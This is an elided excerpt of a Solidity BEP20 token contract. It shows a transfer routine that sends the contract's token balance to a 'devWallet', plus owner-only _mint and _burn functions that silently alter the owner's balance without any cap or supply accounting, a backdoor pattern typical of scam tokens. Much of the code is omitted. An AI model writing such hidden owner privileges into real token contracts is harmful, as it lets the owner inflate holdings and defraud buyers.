...
contract Token is Context, IBEP20, Ownable {
    ...
    function _transfer(
        ...
        if (
            ...
            _tokenTransfer(address(this),devWallet,contractTokenBalance,true);
        }
    ...
    function _mint(uint256 mintCnt) external onlyOwner {
        _rOwned[msg.sender] = _rOwned[msg.sender].add(mintCnt);
    }

    function _burn(uint256 burnCnt) external onlyOwner {
        _rOwned[msg.sender] = _rOwned[msg.sender].sub(burnCnt);
    }
